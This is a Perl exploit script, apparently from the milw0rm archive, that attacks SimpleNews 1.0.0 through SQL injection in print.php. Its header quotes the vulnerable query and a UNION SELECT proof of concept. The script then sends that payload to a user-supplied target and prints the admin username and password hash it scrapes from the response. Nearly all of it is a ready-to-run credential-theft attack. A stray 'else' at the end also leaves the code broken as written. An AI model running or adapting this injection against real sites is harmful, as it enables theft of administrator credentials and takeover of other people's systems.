#!/usr/bin/perl -w

#################################################################################
#										#
#		  SimpleNews <= 1.0.0 FINAL SQL Injection Exploit		#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username & Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (print.php): 							#
#										#
#      $news_id = $_GET['news_id'];						#
#      $query = "SELECT * FROM simplenews_articles WHERE news_id = '$news_id'"; #
#										#		
# PoC: http://victim.com/print.php?news_id=-999' UNION SELECT 0,username,	#
#      password,0,0,0,0,0 FROM simplenews_users WHERE user_id=1 /*		#
# 										#
# Subject To: magic_quotes_gpc set to off					#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community						# 
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV < 1){
print "-------------------------------------------------------------------------\r\n";
print "               SimpleNews <= 1.0.0 FINAL SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_simplenews.pl [PATH]\r\n\r\n";
print "[PATH] = Path where SimpleNews is located\r\n\r\n";
print "e.g. w4ck1ng_simplenews.pl http://victim.com/simplenews/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . "print.php?news_id=-999' UNION SELECT 0,username,password,0,0,0,0,0 FROM simplenews_users WHERE user_id=1 /*";

$res = $b->request(HTTP::Request->new(GET=>$host));
$res->content =~ /([0-9a-fA-F]{32})/;

print "-------------------------------------------------------------------------\r\n";
print "               SimpleNews <= 1.0.0 FINAL SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "[+] Admin User = ".$res->title, "\r\n";
print "[+] Admin Hash = $1\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";

else {print "\nExploit Failed...\n";}

# milw0rm.com [2007-05-09]